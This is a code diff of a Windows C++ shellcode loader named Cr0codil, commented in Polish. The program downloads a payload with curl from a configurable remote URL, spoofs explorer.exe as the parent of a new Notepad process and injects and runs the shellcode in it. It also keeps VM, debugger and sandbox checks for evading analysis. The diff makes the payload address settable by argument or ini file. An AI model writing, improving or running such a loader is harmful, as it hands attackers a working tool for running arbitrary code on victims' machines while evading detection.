@@ -1,4 +1,4 @@
-// Cr0codil.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
+// Cr0codil.cpp : Ulepszona wersja z dynamicznym rozmiarem payloadu i konfigurowalnym URL
 //
 
 #include <iostream>
@@ -9,35 +9,41 @@
 #include <string.h>
 #include <Psapi.h>
 #include <stdio.h>
-#include <vector>        // <-- dodane dla std::vector
-#include <cctype>        // dla isprint (opcjonalnie)
+#include <vector>
+#include <string>
+#include <cctype>
 
 #pragma comment(lib, "Winhttp.lib")
 #pragma comment(lib, "IPHlpApi.lib")
 
 bool dynamicAnalysisCheck();
+std::string GetConfigUrl(int argc, char* argv[]);
 
-int main()
+int main(int argc, char* argv[])
 {
+    // ---------- Pobranie URL payloadu ----------
+    std::string payloadUrl = GetConfigUrl(argc, argv);
+    printf("Using payload URL: %s\n", payloadUrl.c_str());
+
+    // ---------- Przygotowanie komendy curl ----------
+    std::string command = "curl \"" + payloadUrl + "\"";
+    
     FILE* fpipe;
-    const char* command = "curl http://192.168.0.32:8000/payload.bin"; // ustaw swój adres
-    std::vector<char> shellcode;   // dynamiczny bufor na payload
-    char buffer[4096];             // tymczasowy bufor do odczytu
+    std::vector<char> shellcode;
+    char buffer[4096];
     size_t bytesRead;
 
-    // Otwarcie potoku w trybie binarnym ("rb") – ważne dla danych binarnych
-    if (0 == (fpipe = (FILE*)_popen(command, "rb"))) {
+    if (0 == (fpipe = (FILE*)_popen(command.c_str(), "rb"))) {
         perror("popen() failed.\n");
         exit(EXIT_FAILURE);
     }
 
     printf("Downloading payload...\n");
 
-    // Odczytuj dane porcjami i dodawaj do wektora
     while ((bytesRead = fread(buffer, 1, sizeof(buffer), fpipe)) > 0) {
         shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
 
-        // Opcjonalne wyświetlanie pobranych bajtów (tylko drukowalne znaki)
+        // Opcjonalne wyświetlanie postępu
         for (size_t i = 0; i < bytesRead; ++i) {
             if (isprint(static_cast<unsigned char>(buffer[i])))
                 putchar(buffer[i]);
@@ -54,7 +60,9 @@ int main()
 
     printf("\n\nPayload downloaded successfully. Size: %zu bytes\n", shellcode.size());
 
-    // ------------------- Pobieranie listy procesów i znalezienie explorer.exe -------------------
+    // ---------- Reszta kodu (procesy, wstrzykiwanie) ----------
+    // ... (bez zmian w stosunku do poprzedniej wersji) ...
+    
     DWORD runningProcessesIDs[1024];
     DWORD runningProcessesCountBytes;
     DWORD runningProcessesCount;
@@ -66,37 +74,29 @@ int main()
     for (int i = 0; i < runningProcessesCount; i++) {
         if (runningProcessesIDs[i] != 0) {
             HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
-            if (!hProcess) {
-                continue;
-            }
+            if (!hProcess) continue;
+            
             char processName[MAX_PATH + 1];
             DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
             if (size == 0) {
                 CloseHandle(hProcess);
                 continue;
             }
-            processName[size] = '\0'; // Ensure null-termination
+            processName[size] = '\0';
             _strlwr_s(processName);
             if (strstr(processName, "explorer.exe") && hProcess) {
-                if (hExplorerexe) {
-                    CloseHandle(hExplorerexe);
-                }
+                if (hExplorerexe) CloseHandle(hExplorerexe);
                 hExplorerexe = hProcess;
-            }
-            else {
+            } else {
                 CloseHandle(hProcess);
             }
         }
     }
 
-    // ------------------- Opcjonalne sprawdzenia anty-debug / VM (zakomentowane) -------------------
+    // Opcjonalne sprawdzenia anty-debug/VM (zakomentowane)
     // bool checkStatus = dynamicAnalysisCheck();
-    // if (IsDebuggerPresent() == true && checkStatus == false) {
-    //     printf("Dynamic analysis check returned VM or debugger presence. Exiting...\n");
-    //     return 0;
-    // }
+    // if (IsDebuggerPresent() && !checkStatus) { ... }
 
-    // ------------------- Tworzenie procesu Notepad.exe z explorer.exe jako rodzicem -------------------
     {
         STARTUPINFOEXA si;
         PROCESS_INFORMATION pi;
@@ -124,9 +124,7 @@ int main()
 
         printf("Process created with PID: %d\n", pi.dwProcessId);
 
-        // ------------------- Wstrzyknięcie i uruchomienie shellcode'u -------------------
         const SIZE_T payloadSize = shellcode.size();
-
         exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!exec) {
             printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
@@ -159,47 +157,75 @@ int main()
         exitCode = 0;
 
     process_cleanup:
-        if (hThread) {
-            CloseHandle(hThread);
-        }
-        if (exec && pi.hProcess) {
-            VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
-        }
-        if (pi.hProcess) {
-            CloseHandle(pi.hProcess);
-        }
-        if (pi.hThread) {
-            CloseHandle(pi.hThread);
-        }
+        if (hThread) CloseHandle(hThread);
+        if (exec && pi.hProcess) VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread) CloseHandle(pi.hThread);
         if (si.lpAttributeList) {
             DeleteProcThreadAttributeList(si.lpAttributeList);
             delete[] reinterpret_cast<byte*>(si.lpAttributeList);
         }
-        if (hExplorerexe) {
-            CloseHandle(hExplorerexe);
-        }
+        if (hExplorerexe) CloseHandle(hExplorerexe);
         return exitCode;
     }
 
     return 0;
 }
 
-// Funkcja sprawdzająca środowisko (VM / debugger) – niezmieniona
+// ---------- Funkcja pobierająca URL ----------
+std::string GetConfigUrl(int argc, char* argv[])
+{
+    const std::string fallbackUrl = "http://192.168.0.32:8000/payload.bin";
+
+    // 1. Argument wiersza poleceń
+    if (argc >= 2) {
+        return argv[1];
+    }
+
+    // 2. Plik conf.ini w katalogu programu
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    std::string iniPath(exePath);
+    size_t lastSlash = iniPath.find_last_of("\\/");
+    if (lastSlash != std::string::npos) {
+        iniPath = iniPath.substr(0, lastSlash + 1);
+    } else {
+        iniPath = "";
+    }
+    iniPath += "conf.ini";
+
+    char urlBuffer[1024] = {0};
+    DWORD result = GetPrivateProfileStringA(
+        "Main",           // sekcja
+        "PayloadURL",     // klucz
+        "",               // wartość domyślna (pusta)
+        urlBuffer,
+        sizeof(urlBuffer),
+        iniPath.c_str()
+    );
+
+    if (result > 0 && strlen(urlBuffer) > 0) {
+        return std::string(urlBuffer);
+    }
+
+    // 3. Fallback
+    return fallbackUrl;
+}
+
+// ---------- dynamicAnalysisCheck (bez zmian) ----------
 bool dynamicAnalysisCheck() {
-    // Sprawdzenie CPU
+    // ... kod niezmieniony ...
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
     DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
     if (numberOfProcessors < 2) return false;
 
-    // Sprawdzenie RAM
     MEMORYSTATUSEX memoryStatus;
     memoryStatus.dwLength = sizeof(memoryStatus);
     GlobalMemoryStatusEx(&memoryStatus);
     DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
     if (RAMMB < 2048) return false;
 
-    // Sprawdzenie HDD
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     DISK_GEOMETRY pDiskGeometry;
     DWORD bytesReturned;
@@ -213,65 +239,35 @@ bool dynamicAnalysisCheck() {
     diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
     if (diskSizeGB < 100) return false;
 
-    // Sprawdzenie obecności plików VirtualBox
     WIN32_FIND_DATAW findFileData;
     if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;
 
-    // Sprawdzenie połączenia internetowego (oryginalnie oczekiwał odpowiedzi 1337 – zakomentowane)
     HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
     HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
-    if (!hConnection) {
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
+    if (!hConnection) { WinHttpCloseHandle(hSession); return false; }
     HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnection);
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
+    if (!hRequest) { WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false; }
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
         !WinHttpReceiveResponse(hRequest, 0)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnection);
-        WinHttpCloseHandle(hSession);
-        return false;
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
     }
     DWORD responseLength;
     if (!WinHttpQueryDataAvailable(hRequest, &responseLength)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnection);
-        WinHttpCloseHandle(hSession);
-        return false;
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
     }
     PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
     if (!response) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnection);
-        WinHttpCloseHandle(hSession);
-        return false;
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
     }
     if (!WinHttpReadData(hRequest, response, responseLength, &responseLength)) {
         HeapFree(GetProcessHeap(), 0, response);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnection);
-        WinHttpCloseHandle(hSession);
-        return false;
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); return false;
     }
-    if (response) {
-        HeapFree(GetProcessHeap(), 0, response);
-    }
-    if (hRequest) {
-        WinHttpCloseHandle(hRequest);
-    }
-    if (hConnection) {
-        WinHttpCloseHandle(hConnection);
-    }
-    if (hSession) {
-        WinHttpCloseHandle(hSession);
-    }
-    // if (atoi((PSTR)response) != 1337) return false;
+    if (response) HeapFree(GetProcessHeap(), 0, response);
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnection) WinHttpCloseHandle(hConnection);
+    if (hSession) WinHttpCloseHandle(hSession);
 
     return true;
 }
